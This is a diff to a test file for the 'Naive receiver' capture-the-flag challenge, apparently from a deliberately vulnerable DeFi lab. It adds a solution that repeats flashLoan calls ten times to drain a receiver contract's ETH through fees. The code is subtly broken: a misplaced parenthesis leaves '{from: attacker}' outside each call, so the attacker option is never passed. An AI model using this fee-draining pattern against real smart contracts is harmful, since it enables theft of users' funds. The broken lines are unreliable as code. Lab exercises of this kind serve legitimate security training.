@@ -35,8 +35,17 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     after(async function () {
-        /** SUCCESS CONDITIONS */
-        // All ETH has been drained from the receiver
+        /** Will refacotre one day in 1 transaction with contract */
+        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};        
         expect(
             await balance.current(this.receiver.address)
         ).to.be.bignumber.equal('0');
